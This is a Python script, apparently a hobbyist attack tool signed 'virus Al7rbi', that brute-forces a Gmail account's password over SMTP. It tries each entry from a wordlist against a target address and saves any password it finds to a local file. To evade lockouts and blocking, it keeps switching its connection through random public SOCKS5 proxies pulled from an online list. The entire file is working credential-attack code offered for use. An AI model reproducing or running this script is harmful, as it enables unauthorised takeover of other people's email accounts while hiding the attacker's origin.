from threading import Thread
from random import choice
import requests
import smtplib
import socks
import time
import sys
virus = """

       .__
___  __|__|_______  __ __  ______
\  \/ /|  |\_  __ \|  |  \/  ___/
 \   / |  | |  | \/|  |  /\___ \
  \_/  |__| |__|   |____//____  >
                              \/
made by virus Al7rbi :)
"""
print(virus)





#change ip
def ip_changer():
    while True:
        r = requests.get('https://www.proxy-list.download/api/v1/get?type=socks5').text
        proxy = str(choice(r.splitlines())).split(':')
        socks.setdefaultproxy(socks.SOCKS5, proxy[0], int(proxy[1]))
        socks.wrapmodule(smtplib)
        time.sleep(5)
        print(f'[!]IP CHANGED TO {proxy[0]}')


#static
try:
    server = smtplib.SMTP('smtp.gmail.com:587')
    # server.ehlo()
    server.starttls()
    print('[*]Connected')
except Exception:
    print('[!]Error to connection')
    sys.exit()
username = input("Email : ")
File = input("passwords list: ")
password = open(File).read().splitlines()
amount = str(len(password))


def hack():
    print(f'[*]start trying , try ({amount})password')

    for passwd in password:
        try:
            server.login(username, passwd)
            combination = (username + ":" + passwd)
            print(f'[*]Found : {combination}')
            break
        except smtplib.SMTPAuthenticationError as msg:
            if msg.smtp_code == 534:
                print(f'[*] Get it ({passwd})')
                password_is = open('passwords.txt', 'a')
                password_is.write(f"{username}:{passwd}")
                password_is.close()
                print('the password in the file')
                sys.exit()
            elif msg.smtp_code == 535:
                print(f"[×]Not this ({passwd})")
                time.sleep(0.5)
            elif msg.smtp_code == 553:
                print('[!]Email Error')
        except smtplib.SMTPServerDisconnected as dis:
            if dis == 'Connection unexpectedly closed':
                print('[!]Connection unexpectedly closed ...')




if __name__ == '__main__':
    Thread(target = ip_changer).start()
    Thread(target = hack).start()
